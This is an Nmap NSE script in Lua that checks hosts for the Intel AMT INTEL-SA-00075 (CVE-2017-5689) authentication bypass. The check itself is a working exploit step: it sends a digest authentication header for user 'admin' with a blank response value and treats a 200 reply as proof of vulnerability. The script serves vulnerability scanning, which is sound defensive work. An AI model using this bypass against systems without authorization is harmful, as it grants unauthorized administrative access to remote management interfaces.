description = [[
Detects if Intel Active Management Technology is vulnerable to the INTEL-SA-00075 authentication bypass
vulnerability by attempting to perform digest authentication with a blank response parameter.
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"

---
-- @usage
-- nmap -p 16992 --script http-vuln-INTEL-SA-00075 <target>
--
-- @output
-- PORT      STATE SERVICE       REASON
-- 16992/tcp open  amt-soap-http syn-ack
-- | http-vuln-INTEL-SA-00075:
-- |   VULNERABLE:
-- |   Intel Active Management Technology INTEL-SA-00075 Authentication Bypass
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-5689  BID:98269
-- |     Risk factor: High  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/AU:N/C:C/I:C/A:C)
-- |       Intel Active Management Technology is vulnerable to an authentication bypass that
-- |       can be exploited by performing digest authentication and sending a blank response
-- |       digest parameter.
-- |
-- |     Disclosure date: 2017-05-01
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5689
-- |       https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr
-- |       http://www.securityfocus.com/bid/98269
-- |       https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf
-- |       https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability
-- |_      https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability

author = "Andrew Orr"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "auth", "exploit" }

portrule = shortport.portnumber({623, 664, 16992, 16993, 16994, 16995})

action = function(host, port)
    local vuln = {
        title = "Intel Active Management Technology INTEL-SA-00075 Authentication Bypass",
        state = vulns.STATE.NOT_VULN,
        risk_factor = "High",
        scores = {
            CVSSv2 = "10.0 (HIGH) (AV:N/AC:L/AU:N/C:C/I:C/A:C)",
        },
        description = [[
Intel Active Management Technology is vulnerable to an authentication bypass that
can be exploited by performing digest authentication and sending a blank response
digest parameter.
        ]],
        IDS = {
            CVE = "CVE-2017-5689",
            BID = "98269"
        },
        references = {
            'https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr',
            'https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability',
            'https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf',
            'https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability'
        },
        dates = {
            disclosure = { year = '2017', month = '05', day = '01' }
        }
    }

    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

    local response = http.get(host, port, '/index.htm')

    if response.header['server']:find('Intel(R) Active Management Technology', 1, true) and response.status == 401 then
        local www_authenticate = http.parse_www_authenticate(response.header['www-authenticate'])
        auth_header = 'Digest ' ..
            'username="admin", ' ..
            'realm="' .. www_authenticate[1]['params']['realm'] .. '", ' ..
            'nonce="' .. www_authenticate[1]['params']['nonce'] .. '", ' ..
            'uri="/index.htm", ' ..
            'cnonce="' .. stdnse.generate_random_string(10) .. '", ' ..
            'nc=1, ' ..
            'qop="auth", ' ..
            'response=""'
        local opt = { header = { ['Authorization'] = auth_header } }
        local response2 = http.get(host, port, '/index.htm', opt)
        if response2.status == 200 then
            vuln.state = vulns.STATE.VULN
        end
    end        

    return vuln_report:make_output(vuln)
end
